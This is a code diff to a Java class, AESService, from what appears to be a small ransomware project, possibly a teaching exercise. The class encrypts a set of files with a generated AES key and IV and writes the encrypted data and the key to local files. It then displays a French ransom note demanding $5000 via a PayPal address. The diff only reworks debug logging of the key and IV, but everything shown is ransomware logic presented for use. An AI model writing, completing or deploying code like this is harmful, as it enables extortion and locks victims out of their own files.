@@ -52,10 +52,9 @@ public class AESService {
         List<FileAsBytes> fileBytes = FileUtils.toBytes(files);
 
         SecretKey key = RandomUtils.generateKey();
+        Logger.logDebug(String.format("Key : %s", Base64.getEncoder().encodeToString(key.getEncoded())));
         IvParameterSpec iv = RandomUtils.generateIv();
-
-        Logger.logDebug(String.format("Key : %s", key.getEncoded().toString()));
-        Logger.logDebug(String.format("IV : %s", iv.getIV().toString()));
+        Logger.logDebug(String.format("IV : %s", Base64.getEncoder().encodeToString(iv.getIV())));
 
         // Encrypt file bytes
         List<FileAsBytes> encryptedBytes = CipherUtils.encrypt(fileBytes, key, iv);
@@ -63,11 +62,13 @@ public class AESService {
 
         // Save filenames and contents to pirate.txt
         FileUtils.saveStrings(directory, ENCRYPTED_FILES_FILENAME, encryptedFiles);
+        Logger.logDebug(String.format("Save encrypted files to %s", ENCRYPTED_FILES_FILENAME));
 
         // Save key and iv to pirate.json
         JsonUtils.saveEncryptionParams(directory, ENCRYPTION_PARAMS_FILENAME, key, iv);
+        Logger.logDebug(String.format("Save key and iv to %s", ENCRYPTION_PARAMS_FILENAME));
 
-        // TODO : Delete encrypted files?
+        // TODO : Delete files?
 
         // Display ransom message
         Logger.logInfo("Cet ordinateur est piraté, plusieurs fichiers ont été chiffrés, une rançon de 5000$ doit être payée sur le compte PayPal hacker@gmail.com pour pouvoir récupérer vos données.");
